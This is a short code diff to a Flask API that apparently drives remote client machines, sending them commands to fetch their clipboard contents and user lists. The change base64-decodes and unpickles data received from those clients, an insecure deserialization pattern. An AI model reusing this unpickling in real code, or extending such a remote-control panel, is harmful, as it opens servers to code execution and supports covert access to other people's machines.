@@ -4,6 +4,8 @@ import threading
 import common
 import json
 import os
+import pickle
+import codecs
 
 
 api_routes = flask.Blueprint('api', __name__)
@@ -79,16 +81,17 @@ def clipboard_payload():
 
 
 @api_routes.route('/api/payload/users', methods=['POST'])
-def clipboard_payload():
+def users_payload():
 	data = json.loads(flask.request.data.decode())
 	client = data["client"]
 
 	if client:
 		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
 		if client_sock:
-			common.send_msg(client_sock, "clipboard".encode())
+			common.send_msg(client_sock, "users".encode())
 			users = common.recv_msg(client_sock)
-			return users.decode(), 200
+			users = pickle.loads(codecs.decode(users, "base64"))
+			return users, 200
 		else:
 			return "Error", 500
 	else:
